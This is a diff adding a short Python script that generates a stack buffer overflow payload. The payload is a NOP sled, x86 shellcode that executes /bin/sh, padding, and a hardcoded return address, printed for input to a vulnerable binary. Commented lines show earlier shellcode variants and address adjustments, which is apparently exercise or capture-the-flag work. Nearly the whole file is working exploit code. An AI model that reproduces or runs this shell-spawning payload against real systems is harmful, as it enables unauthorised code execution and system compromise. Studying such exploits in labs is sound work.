@@ -1,0 +1,16 @@
+#bash = "\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x90"
+#bash = "\x31\xdb\x31\xc0\xb0\x01\xcd\x80"
+bash = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\xff\xff\xff\xff"
+amo = "\x90" * (256-len(bash)) + bash
+amo += "\x90"*4
+amo += "\xa4\xf6\xff\xbf"
+#amo = amo.ljust(, "P")
+#addr = "bf-ff-f1-ac".split("-")
+#amo = list(amo)
+#for i in range(4):
+#	amo[256+18 + i] = chr(int(addr[3 - i], 16))
+#amo = "".join(amo)
+#print(len(amo))
+print(amo)
+#print(str(amo.encode('latin-1')).replace("b\'", "").replace("'", ""))
+#print(amo)
